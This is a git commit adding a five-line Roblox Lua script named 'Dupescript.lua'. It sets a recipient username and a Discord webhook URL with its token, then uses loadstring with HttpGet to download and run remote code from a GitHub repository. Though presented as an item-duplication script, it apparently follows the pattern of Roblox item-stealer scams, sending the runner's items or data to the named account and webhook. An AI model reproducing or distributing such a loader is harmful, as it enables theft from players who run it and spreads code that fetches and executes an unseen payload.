f668a37934b09cfa94b749ebe3875c5f8d1e7332
Ezjq <kokieunz@gmail.com>
2024-11-12 15:17:03 +0800

    Create Dupescript.lua

---
+++ Dupescript.lua
@@ -0,0 +1,5 @@
+Username = "givepetroblox" --// Username
+Webhook = "https://discord.com/api/webhooks/1305433436755853314/b7HCdbAdCh0YRkjjKX0iZfduUKJyW2YCO7uMd7weCXri4NQzFvJSS6bS2kaEwOxMOo7s" --// Webhook
+CustomGui = "https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/Dupe.lua" --// Paste Raw Link Script
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/testo.lua"))()
